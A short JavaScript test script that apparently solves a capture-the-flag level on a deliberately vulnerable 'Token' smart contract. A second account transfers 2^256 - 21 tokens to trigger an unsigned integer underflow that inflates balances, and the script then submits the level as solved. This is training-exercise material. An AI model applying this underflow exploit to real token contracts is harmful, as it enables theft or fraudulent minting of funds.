const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, s2, challenge, tx

before(async () => {
    ;[s1, s2] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x478f3476358Eb166Cb7adE4666d04fbdDB56C407")
    challenge = await ethers.getContractAt("Token", challengeAddress)
})

it("solves the challenge", async function () {
    //max uint256 = (2 ** 256) - 1
    let value = 2n ** 256n - 21n
    tx = await challenge.connect(s2).transfer(s1.address, value)
    await tx.wait()

    console.log(await challenge.balanceOf(s1.address))
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
